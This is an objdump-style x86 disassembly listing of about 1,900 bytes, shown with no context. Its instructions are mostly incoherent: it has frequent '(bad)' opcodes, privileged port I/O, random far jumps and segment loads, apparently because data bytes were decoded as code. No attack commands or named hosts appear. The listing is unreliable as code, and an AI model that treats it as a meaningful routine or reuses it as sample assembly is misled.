  4116cc:	jbe    0x41170f
  4116ce:	in     al,0x36
  4116d0:	nop
  4116d1:	and    eax,ecx
  4116d3:	jl     0x41174a
  4116d5:	mov    ah,0xbd
  4116d7:	(bad)  
  4116d8:	push   ecx
  4116d9:	es out dx,eax
  4116db:	sub    al,0x8e
  4116dd:	pop    ds
  4116de:	pop    eax
  4116df:	lods   al,BYTE PTR ds:[esi]
  4116e0:	repnz mov ah,0xda
  4116e3:	lea    eax,ds:0xa13d7882
  4116e9:	xrelease xchg DWORD PTR [ecx+0x657ab4e0],esi
  4116f0:	test   eax,0x718fbd22
  4116f5:	inc    ebp
  4116f6:	pushf  
  4116f7:	xchg   edx,edi
  4116f9:	fidivr DWORD PTR [edx+0x4]
  4116fc:	and    al,BYTE PTR [edi+0x497b17ac]
  411702:	push   0x1a3669a8
  411707:	sbb    eax,esi
  411709:	jb     0x411742
  41170b:	cli    
  41170c:	out    0x9a,al
  41170e:	in     al,dx
  41170f:	or     BYTE PTR [esi],bh
  411711:	xlat   BYTE PTR ds:[ebx]
  411712:	jo     0x4116a7
  411714:	sub    esi,eax
  411716:	sbb    al,0x33
  411718:	cdq    
  411719:	ins    BYTE PTR es:[edi],dx
  41171a:	cmp    al,0x69
  41171c:	data16 cli 
  41171e:	arpl   WORD PTR [esi],ax
  411720:	push   ss
  411721:	push   ecx
  411722:	lods   eax,DWORD PTR ds:[esi]
  411723:	dec    ecx
  411724:	push   cs
  411725:	ins    BYTE PTR es:[edi],dx
  411726:	jge    0x41176e
  411728:	and    eax,0x9a1d2b9e
  41172d:	jp     0x411713
  41172f:	mov    eax,ds:0x1aede124
  411734:	enter  0xa242,0x79
  411738:	sub    al,0x4e
  41173a:	inc    edx
  41173b:	or     ebx,edx
  41173d:	and    esp,0xffffffa6
  411740:	cmp    eax,0x490b53bb
  411745:	ret    
  411746:	loope  0x41170d
  411748:	shl    cl,cl
  41174a:	push   0xa8a6ed10
  41174f:	inc    edi
  411750:	daa    
  411751:	ror    BYTE PTR [esi],0x5a
  411754:	mov    dl,0x1e
  411756:	push   ss
  411757:	and    dh,ch
  411759:	pop    ebx
  41175a:	mov    BYTE PTR [esi+0x71],dl
  41175d:	mov    esp,0x262b6439
  411762:	je     0x4117da
  411764:	mov    al,0xb0
  411766:	or     DWORD PTR [ecx],0xffffff84
  411769:	das    
  41176a:	push   ds
  41176b:	xor    ah,BYTE PTR [edi-0x769405ef]
  411771:	jecxz  0x411745
  411773:	mov    eax,DWORD PTR fs:[esi]
  411776:	dec    ecx
  411777:	rol    DWORD PTR [edi-0x5a],1
  41177a:	outs   dx,BYTE PTR ds:[esi]
  41177b:	cwde   
  41177c:	inc    esi
  41177d:	inc    ebx
  41177e:	and    bh,BYTE PTR [ecx]
  411780:	pop    ebp
  411781:	and    ch,BYTE PTR [edi+0x52]
  411784:	aaa    
  411785:	(bad)  
  411786:	push   ss
  411787:	jmp    0x7b3c:0x24d6131e
  41178e:	adc    BYTE PTR [esp+ebx*1-0x63],0xbe
  411793:	mov    ds:0x126d3523,al
  411798:	push   edi
  411799:	add    al,0x38
  41179b:	and    BYTE PTR [edi-0x70],bh
  41179e:	outs   dx,DWORD PTR ds:[esi]
  41179f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a0:	mov    dh,0xee
  4117a2:	xor    DWORD PTR [ecx+0x807379e],ecx
  4117a8:	sub    ecx,DWORD PTR [eax]
  4117aa:	out    dx,eax
  4117ab:	or     esp,0xffffff91
  4117ae:	retf   
  4117af:	inc    eax
  4117b0:	enter  0x29b8,0x2c
  4117b4:	and    BYTE PTR fs:[edx+0x27fcf26c],0x9b
  4117bc:	mov    ecx,0x4892a47e
  4117c1:	mov    esi,0x3abdfd
  4117c6:	dec    ecx
  4117c7:	jne    0x4117ad
  4117c9:	push   0x6a
  4117cb:	jle    0x4117cc
  4117cd:	sar    ebp,cl
  4117cf:	cld    
  4117d0:	push   edi
  4117d1:	adc    cl,BYTE PTR [ebx]
  4117d3:	cmp    al,0x3
  4117d5:	or     ebx,esi
  4117d7:	fcmovu st,st(0)
  4117d9:	popf   
  4117da:	loopne 0x4117ea
  4117dc:	retf   0x4030
  4117df:	pop    esi
  4117e0:	nop
  4117e1:	jg     0x4117ef
  4117e3:	popa   
  4117e4:	push   esp
  4117e5:	adc    ax,0xae9e
  4117e9:	fistp  QWORD PTR [edi+edi*8]
  4117ec:	xor    dl,dh
  4117ee:	rcr    DWORD PTR [edi+ebx*4],1
  4117f1:	jb     0x41180a
  4117f3:	lea    ebx,[esp+ecx*1+0x1d]
  4117f7:	mov    edi,0x43cc905d
  4117fc:	sbb    eax,0xc72251bc
  411801:	cmp    edi,edi
  411803:	dec    ebx
  411804:	mov    esi,0x8afd87ac
  411809:	outs   dx,BYTE PTR ds:[esi]
  41180a:	adc    ch,al
  41180c:	lock mov BYTE PTR [edx],dh
  41180f:	push   edx
  411810:	sub    edx,edx
  411812:	xchg   BYTE PTR [ebx-0x60bcc26],dh
  411818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411819:	sti    
  41181a:	ss adc eax,0xe4a0cef
  411820:	adc    eax,DWORD PTR [ecx+0x75]
  411823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411824:	xor    ebp,DWORD PTR [ebp+0x4543afd9]
  41182a:	mov    al,0x33
  41182c:	mov    ebx,0x3ba348e4
  411831:	and    al,BYTE PTR [ebp-0x60eaad8f]
  411837:	in     eax,dx
  411838:	sub    DWORD PTR ds:0xbaf3f495,0x3
  41183f:	into   
  411840:	imul   ebp,ecx,0x8efeb690
  411846:	xor    DWORD PTR [edx+0x19],esi
  411849:	lahf   
  41184a:	sti    
  41184b:	ret    0x5265
  41184e:	xchg   ebx,eax
  41184f:	int    0x77
  411851:	out    dx,al
  411852:	mov    esi,DWORD PTR [edx]
  411854:	ss mov bh,0xaa
  411857:	pop    ecx
  411858:	ret    
  411859:	fcom   DWORD PTR [edi-0x2c161ee7]
  41185f:	shl    BYTE PTR [edx],1
  411861:	call   0x845a:0x932a908
  411868:	(bad)  
  411869:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41186b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41186c:	adc    esi,DWORD PTR [ecx-0x2a]
  41186f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411870:	cdq    
  411871:	fadd   QWORD PTR [esi]
  411873:	push   ebp
  411874:	ins    DWORD PTR es:[edi],dx
  411875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411876:	fst    QWORD PTR [edi]
  411878:	test   eax,0xc14223a6
  41187d:	or     al,0x6a
  41187f:	gs (bad) 
  411881:	out    dx,al
  411882:	(bad)  
  411883:	fbstp  TBYTE PTR [ecx+0x53ec37a2]
  411889:	dec    ecx
  41188a:	loop   0x4118c9
  41188c:	shr    DWORD PTR [edx-0xf],cl
  41188f:	mov    ds,eax
  411891:	in     eax,0xde
  411893:	push   esi
  411894:	sbb    eax,0x9013ba61
  411899:	hlt    
  41189a:	mov    bh,0xca
  41189c:	adc    DWORD PTR [ebx-0x2d578c90],edx
  4118a2:	das    
  4118a3:	hlt    
  4118a4:	into   
  4118a5:	sar    BYTE PTR [esi],cl
  4118a7:	repz sbb BYTE PTR ds:0x3663208d,0xb1
  4118af:	pop    es
  4118b0:	lods   eax,DWORD PTR ds:[esi]
  4118b1:	xor    ah,al
  4118b3:	jge    0x411926
  4118b5:	and    al,0x75
  4118b7:	aam    0xc4
  4118b9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bc:	inc    ebp
  4118bd:	fbstp  TBYTE PTR [edx+ebp*4-0x4cf1a4b1]
  4118c4:	int    0x58
  4118c6:	ja     0x411862
  4118c8:	call   0xb311:0x6a0a8204
  4118cf:	fstp   DWORD PTR [eax+0x1e]
  4118d2:	mov    edi,0x4956a3ce
  4118d7:	adc    DWORD PTR [edi+0x3f29a4c],ebx
  4118dd:	addr16 mov ebp,0xbb361f2c
  4118e3:	rcl    BYTE PTR [ecx],cl
  4118e5:	mov    ds:0x51086d1f,al
  4118ea:	ja     0x411918
  4118ec:	(bad)  
  4118ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ee:	ds xchg ebx,eax
  4118f0:	iret   
  4118f1:	and    eax,DWORD PTR [ecx+edx*8]
  4118f4:	mov    esp,0x71ea4cf1
  4118f9:	and    dl,ah
  4118fb:	inc    esi
  4118fc:	push   ecx
  4118fd:	aaa    
  4118fe:	cwde   
  4118ff:	or     al,0x38
  411901:	cdq    
  411902:	mov    ecx,0x511ce853
  411907:	push   ds
  411908:	pop    ebx
  411909:	and    al,0x1f
  41190b:	adc    al,dh
  41190d:	inc    edi
  41190e:	std    
  41190f:	retf   
  411910:	int    0xad
  411912:	and    ch,0x2
  411915:	test   eax,0xc4f0ddc4
  41191a:	add    al,ah
  41191c:	jmp    FWORD PTR [eax]
  41191e:	retf   
  41191f:	or     al,0xf0
  411921:	mov    ecx,0x3a1415f3
  411926:	fwait
  411927:	aas    
  411928:	enter  0x3dee,0x61
  41192c:	lds    esi,FWORD PTR [ebx+0x54a50e41]
  411932:	xchg   esi,eax
  411933:	inc    esp
  411934:	repz or DWORD PTR [ecx+0x7e],edx
  411938:	fidivr WORD PTR [edi+0x4566b57]
  41193e:	out    0x27,eax
  411940:	xchg   esp,eax
  411941:	loope  0x41194c
  411943:	scas   eax,DWORD PTR es:[edi]
  411944:	das    
  411945:	jmp    0x41196f
  411947:	xchg   esp,eax
  411948:	add    DWORD PTR [ecx],ebx
  41194a:	enter  0x6375,0x5
  41194e:	pop    esp
  41194f:	mov    edi,0x71228133
  411954:	iret   
  411955:	adc    ebp,esp
  411957:	dec    ebp
  411958:	sbb    DWORD PTR [edx],esi
  41195a:	mov    al,0x50
  41195c:	fistp  DWORD PTR [eax]
  41195e:	inc    eax
  41195f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411960:	into   
  411961:	cmp    ebx,DWORD PTR [esi-0x34]
  411964:	add    eax,0x9a87d3b0
  411969:	shr    BYTE PTR [eax-0x7d],1
  41196c:	inc    edx
  41196d:	mov    ds:0x47731c17,al
  411972:	fld    TBYTE PTR [edi+0x400ac6f8]
  411978:	iret   
  411979:	mov    ds:0xd4fd3655,eax
  41197e:	not    BYTE PTR [ebx]
  411980:	pop    edi
  411981:	pop    es
  411982:	in     eax,0xb0
  411984:	sti    
  411985:	jmp    0xa826:0xef94250b
  41198c:	mov    al,0x25
  41198e:	sbb    eax,0x4fadf9a3
  411993:	xchg   ecx,eax
  411994:	jb     0x411931
  411996:	sbb    ecx,DWORD PTR [edi+edi*8-0x524f651a]
  41199d:	sti    
  41199e:	xlat   BYTE PTR ds:[ebx]
  41199f:	pop    ss
  4119a0:	shr    ecx,0x68
  4119a3:	sub    eax,0x3ff0082a
  4119a8:	data16 or BYTE PTR [esi],al
  4119ab:	mov    ah,0x2a
  4119ad:	pop    ebx
  4119ae:	dec    ebx
  4119af:	xor    eax,0x2d0eb8cb
  4119b4:	fcmovbe st,st(6)
  4119b6:	push   esi
  4119b7:	xchg   edx,edx
  4119b9:	inc    esi
  4119ba:	sub    al,0x24
  4119bc:	pop    ecx
  4119bd:	push   es
  4119be:	sbb    BYTE PTR [ebx+0x23],bh
  4119c1:	out    0xcb,al
  4119c3:	jecxz  0x4119d9
  4119c5:	xor    ch,BYTE PTR [ebp-0x3d26ee17]
  4119cb:	iret   
  4119cc:	into   
  4119cd:	push   ecx
  4119ce:	adc    eax,0xc42c7131
  4119d3:	push   eax
  4119d4:	(bad)  
  4119d5:	arpl   WORD PTR [edi],bx
  4119d7:	pop    ss
  4119d8:	dec    eax
  4119d9:	jae    0x4119d9
  4119db:	mov    eax,edx
  4119dd:	jge    0x411a44
  4119df:	mov    eax,ds:0x9541c272
  4119e4:	jge    0x411a17
  4119e6:	xchg   edi,eax
  4119e7:	(bad)  
  4119e8:	mov    ecx,0xc1b1dd8f
  4119ed:	xchg   bl,ah
  4119ef:	pop    ds
  4119f0:	push   cs
  4119f1:	jle    0x411a35
  4119f3:	inc    esi
  4119f4:	jmp    0x8fb9:0x80e68998
  4119fb:	xor    BYTE PTR [ebx],0x90
  4119fe:	pusha  
  4119ff:	aad    0x83
  411a01:	imul   BYTE PTR [esi-0x37632b44]
  411a07:	ss std 
  411a09:	add    DWORD PTR [edi-0x4b8924e8],eax
  411a0f:	or     esp,edi
  411a11:	imul   eax,DWORD PTR [eax+0x77],0xffffffc3
  411a15:	popf   
  411a16:	add    DWORD PTR [ebx-0x6a],0x44
  411a1a:	fcomp  QWORD PTR [esi+edi*8]
  411a1d:	lock mov ds:0xf41b3854,al
  411a23:	sub    ebp,DWORD PTR ds:0xdb0e2e11
  411a29:	mov    ebx,ebp
  411a2b:	test   DWORD PTR [ebp-0x6],ebx
  411a2e:	loope  0x4119b2
  411a30:	cmp    eax,0x9d599664
  411a35:	sti    
  411a36:	ss cdq 
  411a38:	bound  ecx,QWORD PTR [edx]
  411a3a:	ss mov edx,0x44223664
  411a40:	test   bh,cl
  411a42:	xchg   edi,eax
  411a43:	adc    ch,BYTE PTR [edi+0x2]
  411a46:	mov    DWORD PTR [eax-0x1c],eax
  411a49:	and    eax,esp
  411a4b:	stos   DWORD PTR es:[edi],eax
  411a4c:	(bad)  
  411a4d:	jne    0x4119f5
  411a4f:	fdiv   QWORD PTR cs:[edi]
  411a52:	arpl   WORD PTR [eax],dx
  411a54:	xchg   ebx,eax
  411a55:	mov    es:0x9a61ff61,al
  411a5b:	call   0x4f93:0xd57b959d
  411a62:	cmp    eax,eax
  411a64:	aaa    
  411a65:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411a67:	fwait
  411a68:	xlat   BYTE PTR ds:[ebx]
  411a69:	std    
  411a6a:	mov    WORD PTR ds:0xe3954f19,ss
  411a70:	mov    ss,WORD PTR ds:0xcaacb068
  411a76:	out    0x3e,eax
  411a78:	loop   0x411aab
  411a7a:	dec    esp
  411a7b:	test   dl,ch
  411a7d:	lods   al,BYTE PTR ds:[esi]
  411a7e:	in     eax,0xc9
  411a80:	add    eax,0xb792b8a0
  411a85:	ret    
  411a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a87:	mov    ah,0x2d
  411a89:	in     al,dx
  411a8a:	(bad)  
  411a8b:	into   
  411a8c:	shr    BYTE PTR [esi-0xe],cl
  411a8f:	ror    DWORD PTR [esp+ebp*2-0x7cd26fbe],1
  411a96:	mov    ebx,0x6c59a7c6
  411a9b:	xor    edx,DWORD PTR [esi-0x4e]
  411a9e:	(bad)  
  411a9f:	xor    ebx,DWORD PTR [ebp+0x30]
  411aa2:	adc    DWORD PTR [ecx],edx
  411aa4:	add    eax,0x178a4b99
  411aa9:	jp     0x411a51
  411aab:	xchg   esp,eax
  411aac:	mov    al,ch
  411aae:	pop    edx
  411aaf:	add    DWORD PTR [edi-0x14],esp
  411ab2:	gs stc 
  411ab4:	push   0x3f580d8d
  411ab9:	and    BYTE PTR [edx],ch
  411abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411abc:	jmp    0xa75b1867
  411ac1:	jmp    DWORD PTR [ecx]
  411ac3:	mov    ecx,0x161dccd7
  411ac8:	push   ebp
  411ac9:	cdq    
  411aca:	pushf  
  411acb:	(bad)  
  411acc:	ins    BYTE PTR es:[edi],dx
  411acd:	in     eax,0xb2
  411acf:	cs adc eax,0xc33b894b
  411ad5:	or     DWORD PTR [edx],ebx
  411ad7:	aas    
  411ad8:	cld    
  411ad9:	stos   BYTE PTR es:[edi],al
  411ada:	ror    ch,cl
  411adc:	not    DWORD PTR [ecx]
  411ade:	ds out 0x0,al
  411ae1:	xor    esi,DWORD PTR [edx]
  411ae3:	or     eax,0xef7afff7
  411ae8:	fadd   DWORD PTR [edi+0x2117ec85]
  411aee:	mov    edx,0x94817f18
  411af3:	push   esi
  411af4:	fs xchg esi,eax
  411af6:	arpl   WORD PTR [eax-0x67],bx
  411af9:	inc    esi
  411afa:	adc    al,0xdb
  411afc:	lods   eax,DWORD PTR ds:[esi]
  411afd:	stos   BYTE PTR es:[edi],al
  411afe:	fistp  WORD PTR [esi+esi*8-0x43fcf7f3]
  411b05:	stc    
  411b06:	fiadd  DWORD PTR cs:[ebx]
  411b09:	mov    cl,0x3b
  411b0b:	mov    dh,0x57
  411b0d:	mov    al,ds:0xd87d303a
  411b12:	loopne 0x411a9d
  411b14:	mov    eax,0x7597525
  411b19:	inc    ebp
  411b1a:	jmp    0x411b7c
  411b1c:	mov    esi,0xe8682c20
  411b21:	popf   
  411b22:	in     eax,dx
  411b23:	mov    esp,0x8188ee1b
  411b28:	jae    0x411af7
  411b2a:	lds    ebx,FWORD PTR [ecx-0x2efa7e25]
  411b30:	aaa    
  411b31:	pop    ss
  411b32:	push   ss
  411b33:	jge    0x411ae3
  411b35:	push   esi
  411b36:	mov    ch,cl
  411b38:	pop    esp
  411b39:	sbb    al,0x2c
  411b3b:	cwde   
  411b3c:	lods   eax,DWORD PTR ds:[esi]
  411b3d:	je     0x411b08
  411b3f:	inc    eax
  411b40:	aas    
  411b41:	push   es
  411b42:	js     0x411bbd
  411b44:	mov    dl,BYTE PTR [ecx]
  411b46:	loopne 0x411b7d
  411b48:	mov    ch,0x32
  411b4a:	stos   BYTE PTR es:[edi],al
  411b4b:	mov    ds:0x1ae396c5,al
  411b50:	adc    ebx,DWORD PTR [edx-0x41]
  411b53:	sub    ah,BYTE PTR [edi-0x78]
  411b56:	lods   al,BYTE PTR ds:[esi]
  411b57:	pop    ebp
  411b58:	int    0x7d
  411b5a:	inc    eax
  411b5b:	xlat   BYTE PTR ds:[ebx]
  411b5c:	cdq    
  411b5d:	aam    0xbd
  411b5f:	out    dx,eax
  411b60:	xchg   esi,eax
  411b61:	or     al,BYTE PTR [eax-0x2f211f1]
  411b67:	mov    ecx,0xc4a02de2
  411b6c:	inc    eax
  411b6d:	xor    DWORD PTR ds:0x3a48556c,esi
  411b73:	push   0x3d
  411b75:	xor    edi,DWORD PTR ds:0x1b57d270
  411b7b:	jge    0x411bc2
  411b7d:	and    ch,BYTE PTR [ecx]
  411b7f:	mov    dl,0x45
  411b81:	sub    edi,0xe6695015
  411b87:	inc    edi
  411b88:	popf   
  411b89:	popa   
  411b8a:	in     eax,0x68
  411b8c:	mov    cl,0xcc
  411b8e:	xchg   ebx,eax
  411b8f:	lahf   
  411b90:	test   BYTE PTR [eax+0x6ceb2ec7],bl
  411b96:	(bad)  [ecx-0x1f1954c7]
  411b9c:	adc    ecx,ebp
  411b9e:	test   BYTE PTR [ecx],0xb8
  411ba1:	mov    WORD PTR [eax],ss
  411ba3:	inc    edx
  411ba4:	and    bl,BYTE PTR [edx-0x595ea684]
  411baa:	sbb    edi,eax
  411bac:	pop    ebp
  411bad:	into   
  411bae:	and    DWORD PTR [edi],ebx
  411bb0:	cwde   
  411bb1:	lods   al,BYTE PTR ds:[esi]
  411bb2:	idiv   DWORD PTR [ebx+eax*2+0x1fb0344a]
  411bb9:	or     al,0x57
  411bbb:	dec    ebp
  411bbc:	or     BYTE PTR [ebx-0x41447836],dl
  411bc2:	xchg   edx,eax
  411bc3:	fcmovne st,st(4)
  411bc5:	mov    ch,0x2b
  411bc7:	sub    al,0x19
  411bc9:	shr    DWORD PTR [eax],1
  411bcb:	xor    DWORD PTR [edi-0xe],esi
  411bce:	in     al,0x70
  411bd0:	mov    ds:0x77ffb650,eax
  411bd5:	fdiv   DWORD PTR [esi]
  411bd7:	jbe    0x411c13
  411bd9:	lea    esp,[edx+0x3e]
  411bdc:	add    edi,DWORD PTR [edi-0x50dcbd91]
  411be2:	lea    ebx,[edi+0x23]
  411be5:	ret    0x88af
  411be8:	stos   DWORD PTR es:[edi],eax
  411be9:	sbb    eax,0x5e42c347
  411bee:	scas   eax,DWORD PTR es:[edi]
  411bef:	mov    ch,0xdd
  411bf1:	aam    0xfe
  411bf3:	cld    
  411bf4:	rol    BYTE PTR [edi+eiz*8+0x2f],cl
  411bf8:	leave  
  411bf9:	leave  
  411bfa:	(bad)  
  411bfb:	mov    ebx,0x57b93ee7
  411c00:	and    dl,dl
  411c02:	std    
  411c03:	(bad)  
  411c04:	pop    ss
  411c05:	or     BYTE PTR [ebp-0x54cb532d],ah
  411c0b:	fisttp DWORD PTR [edi+0x484dc02b]
  411c11:	sub    eax,0x6b236e48
  411c16:	push   esi
  411c17:	clc    
  411c18:	outs   dx,BYTE PTR ds:[esi]
  411c19:	in     al,dx
  411c1a:	pop    esp
  411c1b:	gs dec edx
  411c1d:	jge    0x411bcd
  411c1f:	bound  esi,QWORD PTR [edx-0x3f5e052]
  411c25:	cmp    al,0xff
  411c27:	inc    ebx
  411c28:	fsubr  DWORD PTR [ecx+0x557a9aa0]
  411c2e:	cmc    
  411c2f:	test   eax,0x6f3cdfe7
  411c34:	xor    bh,BYTE PTR [edx-0x13]
  411c37:	sub    DWORD PTR [ecx-0x5808d27a],edi
  411c3d:	daa    
  411c3e:	daa    
  411c3f:	sahf   
  411c40:	add    DWORD PTR [ebp-0x223831ce],esp
  411c46:	mov    DWORD PTR [edx+0x22],eax
  411c49:	xchg   esi,eax
  411c4a:	xchg   DWORD PTR [edi-0x7e],ecx
  411c4d:	imul   edx,ecx,0x4baea409
  411c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c54:	pop    ecx
  411c55:	es das 
  411c57:	mov    ebx,0x9ec099d3
  411c5c:	mov    dh,0xd7
  411c5e:	xor    ecx,DWORD PTR [edx+0x3be0a9a2]
  411c64:	sbb    ecx,DWORD PTR [edi+0x576c7eae]
  411c6a:	outs   dx,BYTE PTR ds:[esi]
  411c6b:	pusha  
  411c6c:	cwde   
  411c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c6e:	fisttp QWORD PTR [ebx+0x40]
  411c71:	sbb    DWORD PTR [ebp-0x7f],0xfffffff2
  411c75:	jo     0x411c93
  411c77:	(bad)  
  411c78:	pop    ebp
  411c79:	(bad)  
  411c7a:	pop    edi
  411c7b:	xchg   esi,eax
  411c7c:	xor    BYTE PTR [eax+esi*2],dl
  411c7f:	mov    ebp,0x8887406f
  411c84:	fs repz retf 
  411c87:	push   0xb46f6c6d
  411c8c:	out    dx,al
  411c8d:	add    eax,0x4c404d70
  411c92:	mov    dh,0x58
  411c94:	pusha  
  411c95:	sar    DWORD PTR [ebx-0x29],cl
  411c98:	cmp    ch,bh
  411c9a:	scas   eax,DWORD PTR es:[edi]
  411c9b:	imul   esp,DWORD PTR [eax+0x66f9227c],0x695ab5ba
  411ca5:	dec    ecx
  411ca6:	mov    ebp,0x5decfc34
  411cab:	push   ss
  411cac:	push   0x53
  411cae:	add    bl,BYTE PTR [ebx]
  411cb0:	mov    cl,0x3e
  411cb2:	mov    ecx,0x497d205e
  411cb7:	push   edx
  411cb8:	mov    al,ds:0x2f088444
  411cbd:	xchg   ebp,eax
  411cbe:	sbb    al,BYTE PTR [edx+eiz*2-0x6e]
  411cc2:	mov    bl,0x4
  411cc4:	pop    ecx
  411cc5:	mov    esp,0x9c459bf2
  411cca:	jge    0x411cf9
  411ccc:	add    ebx,ebp
  411cce:	mov    bh,0x8b
  411cd0:	pop    ds
  411cd1:	jnp    0x411d0c
  411cd3:	add    DWORD PTR [esi+0x41],0xffffff93
  411cd7:	push   0xffffff85
  411cd9:	mov    esi,0x9e06db83
  411cde:	in     al,0xb7
  411ce0:	sub    al,0x48
  411ce2:	adc    DWORD PTR [ebp-0x47be3965],ebp
  411ce8:	mov    WORD PTR [esi+ebp*4+0x4],gs
  411cec:	cmp    DWORD PTR [ecx-0x67d5f06a],edx
  411cf2:	retf   0xed40
  411cf5:	outs   dx,DWORD PTR ds:[esi]
  411cf6:	mov    al,ds:0x3c199bad
  411cfb:	pop    ebp
  411cfc:	out    dx,al
  411cfd:	aas    
  411cfe:	pop    ecx
  411cff:	shr    DWORD PTR [edx],1
  411d01:	pop    es
  411d02:	rol    BYTE PTR ds:0xb7adc35,1
  411d08:	mov    ebx,0xe2ed95f6
  411d0d:	dec    ecx
  411d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d0f:	inc    ecx
  411d10:	jne    0x411d30
  411d12:	ins    DWORD PTR es:[edi],dx
  411d13:	fistp  DWORD PTR [edx-0x7f]
  411d16:	sahf   
  411d17:	shl    BYTE PTR [ebp+0x5b655046],1
  411d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d1e:	mov    ds:0x7269f4e9,eax
  411d23:	mov    al,0x89
  411d25:	into   
  411d26:	mov    ah,0x62
  411d28:	mov    eax,0xc769e1ad
  411d2d:	out    dx,al
  411d2e:	inc    ebp
  411d2f:	sub    eax,0x4d90acf2
  411d34:	cmp    eax,DWORD PTR [edi]
  411d36:	jp     0x411d88
  411d38:	sbb    ebp,esp
  411d3a:	iret   
  411d3b:	clc    
  411d3c:	stc    
  411d3d:	jno    0x411d5f
  411d3f:	xlat   BYTE PTR ds:[ebx]
  411d40:	mov    ah,0x6e
  411d42:	mov    WORD PTR [ecx-0x2b4f6360],ds
  411d48:	mov    bh,BYTE PTR [ebp+0x39c030dc]
  411d4e:	inc    edx
  411d4f:	and    DWORD PTR [ebx+0x6d0d3780],0x18f9bcfd
  411d59:	jae    0x411d1f
  411d5b:	pop    ebp
  411d5c:	xor    al,0xe7
  411d5e:	ja     0x411daa
  411d60:	push   0x17
  411d62:	mov    BYTE PTR [eax],ch
  411d64:	mov    cl,BYTE PTR [ebx+0x3a]
  411d67:	and    ecx,DWORD PTR [esi+0x5e]
  411d6a:	jne    0x411d31
  411d6c:	arpl   WORD PTR [ecx+0x62],dx
  411d6f:	fisttp DWORD PTR [edx]
  411d71:	inc    esi
  411d72:	push   ebp
  411d73:	fdivr  QWORD PTR [edi]
  411d75:	ret    0x6df1
  411d78:	mov    eax,ss
  411d7a:	sub    eax,DWORD PTR [ebx-0x2d]
  411d7d:	cdq    
  411d7e:	fisub  DWORD PTR [edi]
  411d80:	test   edi,ebx
  411d82:	inc    ebp
  411d83:	popa   
  411d84:	xchg   ebp,eax
  411d85:	dec    esp
  411d86:	das    
  411d87:	aaa    
  411d88:	enter  0x374,0xe
  411d8c:	xor    DWORD PTR [edi+0x4a],ebx
  411d8f:	push   cs
  411d90:	xchg   ebp,eax
  411d91:	and    al,0x7d
  411d93:	mov    bl,0x72
  411d95:	or     al,0x4a
  411d97:	jno    0x411e0e
  411d99:	and    edx,eax
  411d9b:	jb     0x411dbe
  411d9d:	ss push edi
  411d9f:	cmp    al,0x45
  411da1:	popf   
  411da2:	and    eax,0xb98550d4
  411da7:	lahf   
  411da8:	push   0xd6d1e7cd
  411dad:	adc    al,0x37
  411daf:	pop    edi
  411db0:	xor    esp,0xa8794556
  411db6:	xchg   DWORD PTR [eax+0x3ae040f9],esp
  411dbc:	mov    edi,0x55f42f65
  411dc1:	inc    edx
  411dc2:	push   ecx
  411dc3:	push   ebx
  411dc4:	repnz xchg ebx,eax
  411dc6:	(bad)
  411dca:	rcl    DWORD PTR [esi-0x6d],cl
  411dcd:	in     al,0x54
  411dcf:	out    dx,eax
  411dd0:	out    0x60,al
  411dd2:	dec    ebp
  411dd3:	jmp    0x411d7e
  411dd5:	or     al,BYTE PTR [ebp+0x4e]
  411dd8:	iret   
  411dd9:	mov    eax,DWORD PTR [ecx]
  411ddb:	call   0xcbf33d35
  411de0:	jmp    FWORD PTR [ecx+0x6c]
  411de3:	rcr    DWORD PTR [eax+0x70fe1a74],1
  411de9:	outs   dx,BYTE PTR ds:[esi]
  411dea:	add    ch,ah
  411dec:	scas   eax,DWORD PTR es:[edi]
  411ded:	in     eax,dx
  411dee:	xor    BYTE PTR [edx],dl
  411df0:	pop    ss
  411df1:	mov    WORD PTR [eax+edi*4+0x39],?
  411df5:	push   ebp
  411df6:	addr16 test bh,bh
  411df9:	xchg   ecx,eax
  411dfa:	ror    BYTE PTR [ecx],cl
  411dfc:	push   ebx
  411dfd:	aaa    
  411dfe:	mov    DWORD PTR [edx],ebx
  411e00:	adc    DWORD PTR [ebx],esi
  411e02:	icebp  
  411e03:	mov    eax,ds:0x89efbbbf
  411e08:	(bad)  
  411e09:	std    
  411e0a:	sbb    ebp,DWORD PTR [eax+0xb927a78]
  411e10:	iret   
  411e11:	mov    DWORD PTR ds:0xc5606f14,ebp
  411e17:	dec    esi
  411e18:	and    ebp,edx
  411e1a:	out    dx,eax
  411e1b:	sub    BYTE PTR [eax+0x2ba09328],0xea
  411e22:	xor    BYTE PTR [esi+eiz*2-0x27],0xec
  411e27:	mov    cs,WORD PTR [edx-0x4402a541]
  411e2d:	les    ebp,FWORD PTR [ecx]
  411e2f:	popf   
  411e30:	dec    eax
  411e31:	pop    ebx
  411e32:	sub    edi,DWORD PTR [esi]
  411e34:	(bad)  
  411e35:	in     al,0xf2
  411e37:	sbb    bl,bh
  411e39:	mov    edx,ebx
  411e3b:	(bad)  
  411e3c:	mov    al,0x58
  411e3e:	xchg   edx,eax
  411e3f:	test   DWORD PTR [edi],ebp
  411e41:	cmp    bl,BYTE PTR [ebp+0x66]
  411e44:	pop    es
  411e45:	aam    0xdd
  411e47:	jns    0x411eb8
  411e49:	mov    ebp,0x2dc3d49b
  411e4e:	dec    eax
  411e4f:	push   0x1dc8e250
  411e54:	(bad)  
  411e55:	ds shr cl,cl
  411e58:	pop    es
  411e59:	xchg   esi,eax
  411e5a:	out    dx,eax
  411e5b:	ins    BYTE PTR es:[edi],dx
  411e5c:	stc    
